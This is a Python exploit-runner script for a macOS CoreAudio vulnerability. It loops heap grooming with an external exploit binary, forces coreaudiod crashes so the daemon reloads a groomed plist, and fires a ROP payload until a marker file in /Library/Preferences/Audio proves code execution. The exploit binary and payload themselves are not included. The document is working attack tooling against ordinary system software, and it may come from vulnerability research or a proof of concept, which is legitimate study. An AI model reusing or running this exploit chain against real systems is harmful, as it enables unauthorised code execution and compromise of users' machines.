#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import argparse
import shutil

# Configuration
TARGET_FILE = "/Library/Preferences/Audio/malicious.txt"
PLIST_PATH = "/Library/Preferences/Audio/com.apple.audio.SystemSettings.plist"
EXPLOIT_BIN = "./exploit"
ROP_PAYLOAD = "rop_payload.bin"
RESET_SCRIPT = "./reset-devices.sh"
MIN_PLIST_SIZE = 1 
MAX_PLIST_SIZE = 10240

# Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"
BOLD = "\033[1m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"

def print_status(msg):
    print(f"{BLUE}[*]{RESET} {msg}")

def print_success(msg):
    print(f"{GREEN}[+]{RESET} {BOLD}{msg}{RESET}")

def print_error(msg):
    print(f"{RED}[-]{RESET} {msg}")

def print_warning(msg):
    print(f"{YELLOW}[!]{RESET} {msg}")

def check_file_exists(path):
    return os.path.exists(path)

def get_file_size(path):
    try:
        return os.path.getsize(path)
    except OSError:
        return -1

def reset_environment():
    print_status("Resetting CoreAudio environment...")
    if not check_file_exists(RESET_SCRIPT):
        print_error(f"Reset script not found at {RESET_SCRIPT}")
        return False
    
    try:
        subprocess.run([RESET_SCRIPT], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print_success("Environment reset successfully.")
        return True
    except subprocess.CalledProcessError as e:
        print_error(f"Failed to reset environment: {e}")
        return False

def run_command_stream(cmd_args, prefix="  "):
    """Runs a command and streams its output with a prefix."""
    try:
        # Popen to capture stdout/stderr in real-time
        process = subprocess.Popen(
            cmd_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, # Merge stderr into stdout
            text=True,
            bufsize=1, # Line buffered
            errors='replace' # Handle invalid UTF-8 (e.g. 0xAA bytes)
        )
        
        for line in process.stdout:
            sys.stdout.write(f"{prefix}{line}")
            
        process.wait()
        return process.returncode == 0
    except Exception as e:
        print_error(f"Failed to run command {cmd_args}: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="CoreAudio Exploit Runner")
    parser.add_argument("--no-reset", action="store_true", help="Skip environment reset")
    parser.add_argument("--has-groomed", action="store_true", help="Skip initial heap grooming if already done")
    args = parser.parse_args()

    print(f"{BOLD}=== CoreAudio Exploit Runner (Updated) ==={RESET}")
    print(f"Target: {TARGET_FILE}")
    
    # Backup original plist if not already backed up
    if not check_file_exists("default-plist.plist"):
        if check_file_exists(PLIST_PATH):
            print_status(f"Backing up {PLIST_PATH} to default-plist.plist...")
            try:
                shutil.copy2(PLIST_PATH, "default-plist.plist")
                print_success("Backup created.")
            except Exception as e:
                print_error(f"Failed to create backup: {e}")
        else:
            print_warning(f"Could not find {PLIST_PATH} to backup.")
    
    if not args.no_reset:
        print_warning("Ensure you have manually run ./reset-devices.sh as root if needed.")
    
    if not check_file_exists(EXPLOIT_BIN):
        print_error(f"Exploit binary not found at {EXPLOIT_BIN}")
        sys.exit(1)
        
    if not check_file_exists(ROP_PAYLOAD):
        print_error(f"ROP payload not found at {ROP_PAYLOAD}")
        sys.exit(1)

    if check_file_exists(TARGET_FILE):
        print_warning(f"Target file {TARGET_FILE} exists. Attempting removal...")
        try:
            subprocess.run(["sudo", "rm", TARGET_FILE], stderr=subprocess.DEVNULL)
        except:
            pass

    print_status("Starting exploit loop. Press Ctrl+C to stop.")
    
    attempt = 0
    start_time = time.time()
    has_groomed = args.has_groomed
    
    try:
        while True:
            attempt += 1
            elapsed = time.time() - start_time
            
            # 1. Check success first
            if check_file_exists(TARGET_FILE):
                print("\n")
                print_success(f"Success! Payload executed and wrote to {TARGET_FILE}")
                print(f"Total attempts: {attempt}")
                print(f"Total time: {elapsed:.2f}s")
                break
            
            print(f"\n{YELLOW}>> Attempt {attempt} | Time: {elapsed:.0f}s{RESET}")

            # 2. HEAP GROOMING PHASE (Spray if plist is small/default)
            if check_file_exists(PLIST_PATH):
                fsize = get_file_size(PLIST_PATH)
                print(f"  Current plist size: {fsize} bytes")
                
                if fsize > 0 and fsize < MAX_PLIST_SIZE:
                    if not has_groomed:
                        print(f"{BLUE}>> Target plist detected ({fsize} bytes). Spraying heap...{RESET}")
                        # Heap Grooming: 20 iterations, 1200 allocs each
                        success = run_command_stream([EXPLOIT_BIN, "--iterations", "20", "--allocs", "1200"], prefix=f"{MAGENTA}[GROOM] {RESET}")
                        
                        if not success:
                            print_warning("Grooming failed (timeout/crash). Retrying...")
                            time.sleep(1)
                            continue

                        print_status("Grooming complete. Forcing crash to reload state...")
                        # Trigger a crash to force coreaudiod to restart and load the big plist
                        run_command_stream([EXPLOIT_BIN, "--pre-crash"], prefix=f"{RED}[RESTART] {RESET}")
                        
                        print_status("Waiting 5s for coreaudiod to reload with groomed heap...")
                        time.sleep(5)
                        has_groomed = True
                    else:
                        print_status("Skipping heap grooming (already performed).")
            else:
                 print_warning("Plist file not found. Is CoreAudio running?")

            # 3. EXPLOIT TRIGGER PHASE
            print(f"{CYAN}>> Triggering exploit attempt...{RESET}")
            
            # Run the exploit attempt
            if not check_file_exists(TARGET_FILE):
                run_command_stream([EXPLOIT_BIN, "--attempts", "1"], prefix=f"{CYAN}[ATTEMPT] {RESET}")
            
            print_status("Waiting 3s for results...")
            time.sleep(3)
            
    except KeyboardInterrupt:
        print("\n")
        print_status("Exploit stopped by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()
